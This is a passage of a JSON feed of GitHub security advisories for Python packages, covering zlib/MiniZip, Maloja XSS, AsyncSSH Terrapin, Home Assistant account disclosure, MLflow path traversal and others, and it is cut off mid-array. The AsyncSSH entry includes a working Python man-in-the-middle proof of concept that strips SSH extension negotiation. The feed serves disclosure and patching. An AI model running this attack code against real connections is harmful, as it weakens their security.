{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<p>MiniZip in zlib through 1.3 has an integer overflow and resultant heap-based buffer overflow in zipOpenNewFileInZip4_64 via a long filename, comment, or extra field. NOTE: MiniZip is not a supported part of the zlib product.</p>\n<p>pyminizip uses version 1.2.11 of zlib's code.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-45853\">https://nvd.nist.gov/vuln/detail/CVE-2023-45853</a></li>\n<li><a href=\"https://github.com/madler/zlib/pull/843\">https://github.com/madler/zlib/pull/843</a></li>\n<li><a href=\"https://chromium.googlesource.com/chromium/src/+/d709fb23806858847131027da95ef4c548813356\">https://chromium.googlesource.com/chromium/src/+/d709fb23806858847131027da95ef4c548813356</a></li>\n<li><a href=\"https://chromium.googlesource.com/chromium/src/+/de29dd6c7151d3cd37cb4cf0036800ddfb1d8b61\">https://chromium.googlesource.com/chromium/src/+/de29dd6c7151d3cd37cb4cf0036800ddfb1d8b61</a></li>\n<li><a href=\"https://github.com/madler/zlib/blob/ac8f12c97d1afd9bafa9c710f827d40a407d3266/contrib/README.contrib#L1-L4\">https://github.com/madler/zlib/blob/ac8f12c97d1afd9bafa9c710f827d40a407d3266/contrib/README.contrib#L1-L4</a></li>\n<li><a href=\"https://www.winimage.com/zLibDll/minizip.html\">https://www.winimage.com/zLibDll/minizip.html</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2023/10/20/9\">http://www.openwall.com/lists/oss-security/2023/10/20/9</a></li>\n<li><a href=\"https://lists.debian.org/debian-lts-announce/2023/11/msg00026.html\">https://lists.debian.org/debian-lts-announce/2023/11/msg00026.html</a></li>\n<li><a href=\"https://security.netapp.com/advisory/ntap-20231130-0009/\">https://security.netapp.com/advisory/ntap-20231130-0009/</a></li>\n<li><a href=\"https://pypi.org/project/pyminizip/#history\">https://pypi.org/project/pyminizip/#history</a></li>\n<li><a href=\"https://github.com/madler/zlib/commit/73331a6a0481067628f065ffe87bb1d8f787d10c\">https://github.com/madler/zlib/commit/73331a6a0481067628f065ffe87bb1d8f787d10c</a></li>\n<li><a href=\"https://github.com/smihica/pyminizip/blob/master/zlib-1.2.11/contrib/minizip/zip.c\">https://github.com/smihica/pyminizip/blob/master/zlib-1.2.11/contrib/minizip/zip.c</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mq29-j5xf-cjwr\">https://github.com/advisories/GHSA-mq29-j5xf-cjwr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mq29-j5xf-cjwr",
            "title": "[pyminizip] pyminizip affected by zlib's integer overflow/heap based buffer overflow vulnerability due to vulnerable dependency",
            "date_modified": "2023-12-18T19:33:08.000Z",
            "date_published": "2023-10-14T03:31:16.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mq29-j5xf-cjwr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The error page for a missing path echoes the path back to the user. If this contains HTML, an attacker could execute a script on the user's machine inside the Maloja context and perform authorized actions like scrobbling or deleting scrobbles.\nThis does not affect the security of your server. The exploit is purely client-side.\nSince there is very little incentive to mess with your scrobble data and it requires very specific targeting (an attacker would have to send a user a link to their own server),  the severity rating might be misleading.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The Vulnerability is patched in 3.2.2</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/krateng/maloja/security/advisories/GHSA-4h72-34j6-j8x7\">https://github.com/krateng/maloja/security/advisories/GHSA-4h72-34j6-j8x7</a></li>\n<li><a href=\"https://github.com/krateng/maloja/commit/febaff97228b37a192f2630aa331cac5e5c3e98e\">https://github.com/krateng/maloja/commit/febaff97228b37a192f2630aa331cac5e5c3e98e</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4h72-34j6-j8x7\">https://github.com/advisories/GHSA-4h72-34j6-j8x7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4h72-34j6-j8x7",
            "title": "[malojaserver] Maloja error page XSS vulnerability",
            "date_modified": "2023-12-18T19:31:12.000Z",
            "date_published": "2023-12-18T19:31:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4h72-34j6-j8x7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>AsyncSSH v2.14.1 and earlier is vulnerable to a novel prefix truncation attack (a.k.a. Terrapin attack), which allows a man-in-the-middle attacker to strip an arbitrary number of messages right after the initial key exchange, breaking SSH extension negotiation (RFC8308) in the process and thus downgrading connection security.</p>\n<h3 id=\"mitigations\">Mitigations</h3>\n<p>To mitigate this protocol vulnerability, OpenSSH suggested a so-called \"strict kex\" which alters the SSH handshake to ensure a Man-in-the-Middle attacker cannot introduce unauthenticated messages as well as convey sequence number manipulation across handshakes. Support for strict key exchange has been added to AsyncSSH in the patched version. </p>\n<p><strong>Warning: To take effect, both the client and server must support this countermeasure.</strong> </p>\n<p>As a stop-gap measure, peers may also (temporarily) disable the affected algorithms and use unaffected alternatives like AES-GCM instead until patches are available.</p>\n<h3 id=\"details\">Details</h3>\n<p>The SSH specifications of ChaCha20-Poly1305 (<a href=\"mailto:chacha20-poly1305@openssh.com\">chacha20-poly1305@openssh.com</a>) and Encrypt-then-MAC (*<a href=\"mailto:-etm@openssh.com\">-etm@openssh.com</a> MACs) are vulnerable against an arbitrary prefix truncation attack (a.k.a. Terrapin attack). This allows for an extension negotiation downgrade by stripping the SSH_MSG_EXT_INFO sent after the first message after SSH_MSG_NEWKEYS, downgrading security, and disabling attack countermeasures in some versions of OpenSSH. When targeting Encrypt-then-MAC, this attack requires the use of a CBC cipher to be practically exploitable due to the internal workings of the cipher mode. Additionally, this novel attack technique can be used to exploit previously unexploitable implementation flaws in a Man-in-the-Middle scenario.</p>\n<p>The attack works by an attacker injecting an arbitrary number of SSH_MSG_IGNORE messages during the initial key exchange and consequently removing the same number of messages just after the initial key exchange has concluded. This is possible due to missing authentication of the excess SSH_MSG_IGNORE messages and the fact that the implicit sequence numbers used within the SSH protocol are only checked after the initial key exchange.</p>\n<p>In the case of ChaCha20-Poly1305, the attack is guaranteed to work on every connection as this cipher does not maintain an internal state other than the message's sequence number. In the case of Encrypt-Then-MAC, practical exploitation requires the use of a CBC cipher; while theoretical integrity is broken for all ciphers when using this mode, message processing will fail at the application layer for CTR and stream ciphers.</p>\n<p>For more details and a pre-print of the associated research paper, see <a href=\"https://terrapin-attack.com\">https://terrapin-attack.com</a>. This website is not affiliated with AsyncSSH in any way.</p>\n<h3 id=\"poc\">PoC</h3>\n<details>\n  <summary>Extension Negotiation Downgrade Attack (chacha20-poly1305@openssh.com)</summary>\n  \n<pre><code class=\"language-python\">#!/usr/bin/python3\nimport socket\nfrom binascii import unhexlify\nfrom threading import Thread\nfrom time import sleep\n\n#####################################################################################\n## Proof of Concept for the extension downgrade attack                             ##\n##                                                                                 ##\n## Variant: ChaCha20-Poly1305                                                      ##\n##                                                                                 ##\n## Client(s) tested: OpenSSH 9.5p1 / PuTTY 0.79                                    ##\n## Server(s) tested: OpenSSH 9.5p1                                                 ##\n##                                                                                 ##\n## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0    ##\n#####################################################################################\n\n# IP and port for the TCP proxy to bind to\nPROXY_IP = '127.0.0.1'\nPROXY_PORT = 2222\n\n# IP and port of the server\nSERVER_IP = '127.0.0.1'\nSERVER_PORT = 22\n\nLENGTH_FIELD_LENGTH = 4\n\ndef pipe_socket_stream(in_socket, out_socket):\n  try:\n      while True:\n          data = in_socket.recv(4096)\n          if len(data) == 0:\n              break\n          out_socket.send(data)\n  except ConnectionResetError:\n      print(\"[!] Socket connection has been reset. Closing sockets.\")\n  except OSError:\n      print(\"[!] Sockets closed by another thread. Terminating pipe_socket_stream thread.\")\n  in_socket.close()\n  out_socket.close()\n\nrogue_msg_ignore = unhexlify('0000000C060200000000000000000000')\ndef perform_attack(client_socket, server_socket):\n  # Version exchange\n  client_vex = client_socket.recv(255)\n  server_vex = server_socket.recv(255)\n  client_socket.send(server_vex)\n  server_socket.send(client_vex)\n  # SSH_MSG_KEXINIT\n  client_kexinit = client_socket.recv(35000)\n  server_kexinit = server_socket.recv(35000)\n  client_socket.send(server_kexinit)\n  server_socket.send(client_kexinit)\n  # Client will now send the key exchange INIT\n  client_kex_init = client_socket.recv(35000)\n  server_socket.send(client_kex_init)\n  # Insert ignore message (to client)\n  client_socket.send(rogue_msg_ignore)\n  # Wait half a second here to avoid missing EXT_INFO\n  # Can be solved by counting bytes as well\n  sleep(0.5)\n  # KEX_REPLY / NEW_KEYS / EXT_INFO\n  server_response = server_socket.recv(35000)\n  # Strip EXT_INFO before forwarding server_response to client\n  # Length fields of KEX_REPLY and NEW_KEYS are still unencrypted\n  server_kex_reply_length = LENGTH_FIELD_LENGTH + int.from_bytes(server_response[:LENGTH_FIELD_LENGTH])\n  server_newkeys_start = server_kex_reply_length\n  server_newkeys_length = LENGTH_FIELD_LENGTH + int.from_bytes(server_response[server_newkeys_start:server_newkeys_start + LENGTH_FIELD_LENGTH])\n  server_extinfo_start = server_newkeys_start + server_newkeys_length\n  client_socket.send(server_response[:server_extinfo_start])\n\nif __name__ == '__main__':\n  print(\"--- Proof of Concept for extension downgrade attack (ChaCha20-Poly1305) ---\")\n  mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n  mitm_socket.bind((PROXY_IP, PROXY_PORT))\n  mitm_socket.listen(5)\n\n  print(f\"[+] MitM Proxy started. Listening on {(PROXY_IP, PROXY_PORT)} for incoming connections...\")\n  try:\n      while True:\n          client_socket, client_addr = mitm_socket.accept()\n          print(f\"[+] Accepted connection from: {client_addr}\")\n          print(f\"[+] Establishing new target connection to {(SERVER_IP, SERVER_PORT)}.\")\n          server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n          server_socket.connect((SERVER_IP, SERVER_PORT))\n          print(\"[+] Performing extension downgrade\")\n          perform_attack(client_socket, server_socket)\n          print(\"[+] Downgrade performed. Spawning new forwarding threads to handle client connection from now on.\")\n          forward_client_to_server_thread = Thread(target=pipe_socket_stream, args=(client_socket, server_socket), daemon=True)\n          forward_client_to_server_thread.start()\n          forward_server_to_client_thread = Thread(target=pipe_socket_stream, args=(server_socket, client_socket), daemon=True)\n          forward_server_to_client_thread.start()\n  except KeyboardInterrupt:\n      client_socket.close()\n      server_socket.close()\n      mitm_socket.close()\n</code></pre>\n</details>\n\n<h3 id=\"impact\">Impact</h3>\n<p>This attack targets the specification of ChaCha20-Poly1305 (<a href=\"mailto:chacha20-poly1305@openssh.com\">chacha20-poly1305@openssh.com</a>) and Encrypt-then-MAC (*<a href=\"mailto:-etm@openssh.com\">-etm@openssh.com</a>), which are widely adopted by well-known SSH implementations and can be considered de-facto standard. These algorithms can be practically exploited; however, in the case of Encrypt-Then-MAC, we additionally require the use of a CBC cipher. As a consequence, this attack works against all well-behaving SSH implementations supporting either of those algorithms and can be used to downgrade (but not fully strip) connection security in case SSH extension negotiation (RFC8308) is supported. The attack may also enable attackers to exploit certain implementation flaws in a man-in-the-middle (MitM) scenario.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ronf/asyncssh/security/advisories/GHSA-hfmc-7525-mj55\">https://github.com/ronf/asyncssh/security/advisories/GHSA-hfmc-7525-mj55</a></li>\n<li><a href=\"https://github.com/ronf/asyncssh/commit/0bc73254f41acb140187e0c89606311f88de5b7b\">https://github.com/ronf/asyncssh/commit/0bc73254f41acb140187e0c89606311f88de5b7b</a></li>\n<li><a href=\"https://github.com/ronf/asyncssh/commit/69f5a41b458b29367a65fe469c2b0255b5db210a\">https://github.com/ronf/asyncssh/commit/69f5a41b458b29367a65fe469c2b0255b5db210a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hfmc-7525-mj55\">https://github.com/advisories/GHSA-hfmc-7525-mj55</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hfmc-7525-mj55",
            "title": "[asyncssh] AsyncSSH vulnerable to Prefix Truncation Attack (a.k.a. Terrapin Attack) against ChaCha20-Poly1305 and Encrypt-then-MAC",
            "date_modified": "2023-12-18T19:21:50.000Z",
            "date_published": "2023-12-18T19:21:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hfmc-7525-mj55"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The login page discloses all active user accounts to any unauthenticated browsing request originating on the Local Area Network.</p>\n<h3 id=\"details\">Details</h3>\n<p>Starting the <a href=\"https://www.home-assistant.io/blog/2023/12/06/release-202312/\">Home Assistant 2023.12 release</a>, the login page returns all currently active user accounts to browsing requests from the Local Area Network. Tests showed that this occurs when:</p>\n<ul>\n<li>The request is not authenticated and</li>\n<li>The request originated locally, meaning on the Home Assistant host local subnet or any other private subnet (<code>10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, fd00::/8, ::ffff:10.0.0.0/104, ::ffff:172.16.0.0/108, ::ffff:192.168.0.0/112</code>)</li>\n</ul>\n<p>The rationale behind this is to make the login more user-friendly (see <a href=\"https://www.home-assistant.io/blog/2023/12/06/release-202312/\">release blog post</a>) and an experience better aligned with other applications that have multiple user-profiles.</p>\n<p>However, as a result, all accounts are displayed regardless of them having logged in or not and for any device that navigates to the server. This disclosure is mitigated by the fact that it only occurs for requests originating from a LAN address. But note that this applies to the local subnet where Home Assistant resides and to any private subnet that can reach it.</p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Place a Home Assistant instance on a private subnet, i.e., 192.168.1.0/24.</li>\n<li>Create a few users, let's say, three.</li>\n<li>From any (or another) private subnet on the LAN, like 192.168.2.0/24, open an incognito browser window (to ensure that the browser has no cookies from Home Assistant and therefore is demonstrably unauthenticated) and navigate to the Home Assistant URL.</li>\n<li>The login page will display all three users, including their profile photo.</li>\n</ol>\n<h3 id=\"impact\">Impact</h3>\n<p>The following CVSS string could be shaped to describe the overall impact of this issue:\nAV:A/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N</p>\n<p>As seen, the Exploitability metrics are high, and the Impact metrics are low. This is fitting because the problem does not constitute a critical one, but at the same time, it is trivial to exploit. Still, since the mitigation can be so easily implemented in code to eliminate a typical case of information disclosure, it would certainly be worth pursuing.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/home-assistant/core/security/advisories/GHSA-jqpc-rc7g-vf83\">https://github.com/home-assistant/core/security/advisories/GHSA-jqpc-rc7g-vf83</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-50715\">https://nvd.nist.gov/vuln/detail/CVE-2023-50715</a></li>\n<li><a href=\"https://github.com/home-assistant/core/commit/dbfc5ea8f96bde6cd165892f5a6a6f9a65731c76\">https://github.com/home-assistant/core/commit/dbfc5ea8f96bde6cd165892f5a6a6f9a65731c76</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jqpc-rc7g-vf83\">https://github.com/advisories/GHSA-jqpc-rc7g-vf83</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jqpc-rc7g-vf83",
            "title": "[homeassistant] User accounts disclosed to unauthenticated actors on the LAN",
            "date_modified": "2023-12-15T23:19:28.000Z",
            "date_published": "2023-12-15T23:19:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jqpc-rc7g-vf83"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Path Traversal: '..\\filename' in GitHub repository mlflow/mlflow prior to 2.9.2.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-6831\">https://nvd.nist.gov/vuln/detail/CVE-2023-6831</a></li>\n<li><a href=\"https://github.com/mlflow/mlflow/commit/1da75dfcecd4d169e34809ade55748384e8af6c1\">https://github.com/mlflow/mlflow/commit/1da75dfcecd4d169e34809ade55748384e8af6c1</a></li>\n<li><a href=\"https://huntr.com/bounties/0acdd745-0167-4912-9d5c-02035fe5b314\">https://huntr.com/bounties/0acdd745-0167-4912-9d5c-02035fe5b314</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-554w-xh4j-8w64\">https://github.com/advisories/GHSA-554w-xh4j-8w64</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-554w-xh4j-8w64",
            "title": "[mlflow] Path traversal in MLflow",
            "date_modified": "2023-12-15T23:01:10.000Z",
            "date_published": "2023-12-15T03:30:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-554w-xh4j-8w64"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Issue: Arbitrary file write in file.py (GHSL-2023-183)</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Use mindsdb staging branch or v23.11.4.1</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mindsdb/mindsdb/security/advisories/GHSA-j8w6-2r9h-cxhj\">https://github.com/mindsdb/mindsdb/security/advisories/GHSA-j8w6-2r9h-cxhj</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j8w6-2r9h-cxhj\">https://github.com/advisories/GHSA-j8w6-2r9h-cxhj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j8w6-2r9h-cxhj",
            "title": "[mindsdb] GitHub Security Lab (GHSL) Vulnerability Report: Arbitary write GHSL-2023-182 ",
            "date_modified": "2023-12-15T04:02:31.000Z",
            "date_published": "2023-12-15T04:02:30.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j8w6-2r9h-cxhj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>SAP&nbsp;BTP&nbsp;Security Services Integration Library ([Python]&nbsp;sap-xssec) - versions &lt; 4.1.0, allow under certain conditions an escalation of privileges. On successful exploitation, an unauthenticated attacker can obtain arbitrary permissions within the application.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-50423\">https://nvd.nist.gov/vuln/detail/CVE-2023-50423</a></li>\n<li><a href=\"https://me.sap.com/notes/3411067\">https://me.sap.com/notes/3411067</a></li>\n<li><a href=\"https://pypi.org/project/sap-xssec/\">https://pypi.org/project/sap-xssec/</a></li>\n<li><a href=\"https://www.sap.com/documents/2022/02/fa865ea4-167e-0010-bca6-c68f7e60039b.html\">https://www.sap.com/documents/2022/02/fa865ea4-167e-0010-bca6-c68f7e60039b.html</a></li>\n<li><a href=\"https://github.com/SAP/cloud-pysec/security/advisories/GHSA-6mjg-37cp-42x5\">https://github.com/SAP/cloud-pysec/security/advisories/GHSA-6mjg-37cp-42x5</a></li>\n<li><a href=\"https://blogs.sap.com/2023/12/12/unveiling-critical-security-updates-sap-btp-security-note-3411067/\">https://blogs.sap.com/2023/12/12/unveiling-critical-security-updates-sap-btp-security-note-3411067/</a></li>\n<li><a href=\"https://github.com/SAP/cloud-pysec/\">https://github.com/SAP/cloud-pysec/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p99h-pfg6-qrfg\">https://github.com/advisories/GHSA-p99h-pfg6-qrfg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p99h-pfg6-qrfg",
            "title": "[sap-xssec] Privilege escalation in sap-xssec",
            "date_modified": "2023-12-15T03:18:45.000Z",
            "date_published": "2023-12-12T03:31:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p99h-pfg6-qrfg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Remote unauthenticated attackers can overwrite arbitrary server files with attacker-controllable data. The data that the attacker can control is not entirely arbitrary. h2o writes a CSV/XLS/etc file to disk, so the attacker data is wrapped in quotations and starts with \"C1\", if they're exporting as CSV.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-6569\">https://nvd.nist.gov/vuln/detail/CVE-2023-6569</a></li>\n<li><a href=\"https://huntr.com/bounties/a5d003dc-c23e-4c98-8dcf-35ba9252fa3c\">https://huntr.com/bounties/a5d003dc-c23e-4c98-8dcf-35ba9252fa3c</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gqrq-j6pm-98c2\">https://github.com/advisories/GHSA-gqrq-j6pm-98c2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gqrq-j6pm-98c2",
            "title": "[h2o] External Control of File Name or Path in h2oai/h2o-3",
            "date_modified": "2023-12-18T22:08:47.000Z",
            "date_published": "2023-12-14T15:30:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gqrq-j6pm-98c2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>When submitting a POST request to the <code>/dataset/new</code> endpoint (including either the auth cookie or the <code>Authorization</code> header) with a specially-crafted field, an attacker can create an out-of-memory error in the hosting server.</p>\n<p>To trigger this error the user needs to have permissions to create or edit datasets.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This vulnerability has been patched in CKAN 2.10.3 and 2.9.10</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ckan/ckan/security/advisories/GHSA-7fgc-89cx-w8j5\">https://github.com/ckan/ckan/security/advisories/GHSA-7fgc-89cx-w8j5</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-50248\">https://nvd.nist.gov/vuln/detail/CVE-2023-50248</a></li>\n<li><a href=\"https://github.com/ckan/ckan/commit/bd02018b65c5b81d7ede195d00d0fcbac3aa33be\">https://github.com/ckan/ckan/commit/bd02018b65c5b81d7ede195d00d0fcbac3aa33be</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7fgc-89cx-w8j5\">https://github.com/advisories/GHSA-7fgc-89cx-w8j5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7fgc-89cx-w8j5",
            "title": "[ckan] Out of memory error when submitting the dataset form with a specially-crafted field",
            "date_modified": "2023-12-13T23:08:36.000Z",
            "date_published": "2023-12-13T23:08:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7fgc-89cx-w8j5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>When submitting a POST request to the <code>/dataset/new</code> endpoint (including either the auth cookie or the <code>Authorization</code> header) with a specially-crafted field, an attacker can create an out-of-memory error in the hosting server.</p>\n<p>To trigger this error the user needs to have permissions to create or edit datasets.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This vulnerability has been patched in CKAN 2.10.3 and 2.9.10</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ckan/ckan/security/advisories/GHSA-7fgc-89cx-w8j5\">https://github.com/ckan/ckan/security/advisories/GHSA-7fgc-89cx-w8j5</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-50248\">https://nvd.nist.gov/vuln/detail/CVE-2023-50248</a></li>\n<li><a href=\"https://github.com/ckan/ckan/commit/bd02018b65c5b81d7ede195d00d0fcbac3aa33be\">https://github.com/ckan/ckan/commit/bd02018b65c5b81d7ede195d00d0fcbac3aa33be</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7fgc-89cx-w8j5\">https://github.com/advisories/GHSA-7fgc-89cx-w8j5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7fgc-89cx-w8j5",
            "title": "[ckan] Out of memory error when submitting the dataset form with a specially-crafted field",
            "date_modified": "2023-12-13T23:08:36.000Z",
            "date_published": "2023-12-13T23:08:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7fgc-89cx-w8j5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Path Traversal in GitHub repository mlflow/mlflow prior to 2.9.2.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-6753\">https://nvd.nist.gov/vuln/detail/CVE-2023-6753</a></li>\n<li><a href=\"https://github.com/mlflow/mlflow/commit/1c6309f884798fbf56017a3cc808016869ee8de4\">https://github.com/mlflow/mlflow/commit/1c6309f884798fbf56017a3cc808016869ee8de4</a></li>\n<li><a href=\"https://huntr.com/bounties/b397b83a-527a-47e7-b912-a12a17a6cfb4\">https://huntr.com/bounties/b397b83a-527a-47e7-b912-a12a17a6cfb4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v945-r3rc-6fjm\">https://github.com/advisories/GHSA-v945-r3rc-6fjm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v945-r3rc-6fjm",
            "title": "[mlflow] Path traversal in MLflow",
            "date_modified": "2023-12-15T22:12:36.000Z",
            "date_published": "2023-12-13T00:30:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v945-r3rc-6fjm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p> In Nautobot 1.x and 2.0.x, the URLs <code>/files/get/?name=...</code> and <code>/files/download/?name=...</code> are used to provide admin access to files that have been uploaded as part of a run request for a Job that has FileVar inputs. Under normal operation these files are ephemeral and are deleted once the Job in question runs. </p>\n<p>It was reported by @kircheneer that in the default implementation used in Nautobot, as provided by <code>django-db-file-storage</code>, these URLs do not by default require any user authentication to access; they should instead be restricted to only users who have permissions to view Nautobot's <code>FileProxy</code> model instances.</p>\n<p>Note that no URL mechanism is provided for listing or traversal of the available file <code>name</code> values, so in practice an unauthenticated user would have to guess names to discover arbitrary files for download, but if a user knows the file name/path value, they can access it without authenticating, so we are considering this a vulnerability.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Fixes will be included in Nautobot 1.6.7 and Nautobot 2.0.6.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>No workaround other than applying the patches included in <a href=\"https://github.com/nautobot/nautobot/pull/4959/files\">https://github.com/nautobot/nautobot/pull/4959/files</a> (2.0.x) or <a href=\"https://github.com/nautobot/nautobot/pull/4964/files\">https://github.com/nautobot/nautobot/pull/4964/files</a> (1.6.x)</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/victor-o-silva/db_file_storage/blob/master/db_file_storage/views.py\">https://github.com/victor-o-silva/db_file_storage/blob/master/db_file_storage/views.py</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nautobot/nautobot/security/advisories/GHSA-75mc-3pjc-727q\">https://github.com/nautobot/nautobot/security/advisories/GHSA-75mc-3pjc-727q</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-50263\">https://nvd.nist.gov/vuln/detail/CVE-2023-50263</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/pull/4959\">https://github.com/nautobot/nautobot/pull/4959</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/pull/4964\">https://github.com/nautobot/nautobot/pull/4964</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/commit/458280c359a4833a20da294eaf4b8d55edc91cee\">https://github.com/nautobot/nautobot/commit/458280c359a4833a20da294eaf4b8d55edc91cee</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/commit/5e2ba9e8ac0840b1c44eb1a8ea3c0bd2c68e4f80\">https://github.com/nautobot/nautobot/commit/5e2ba9e8ac0840b1c44eb1a8ea3c0bd2c68e4f80</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/commit/7c4cf3137f45f1541f09f2f6a7f8850cd3a2eaee\">https://github.com/nautobot/nautobot/commit/7c4cf3137f45f1541f09f2f6a7f8850cd3a2eaee</a></li>\n<li><a href=\"https://github.com/victor-o-silva/db_file_storage/blob/master/db_file_storage/views.py\">https://github.com/victor-o-silva/db_file_storage/blob/master/db_file_storage/views.py</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-75mc-3pjc-727q\">https://github.com/advisories/GHSA-75mc-3pjc-727q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-75mc-3pjc-727q",
            "title": "[nautobot] Unauthenticated db-file-storage views",
            "date_modified": "2023-12-18T18:37:48.000Z",
            "date_published": "2023-12-13T13:35:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-75mc-3pjc-727q"
            },
            "tags": [
                "severity"
            ]
        },
        {
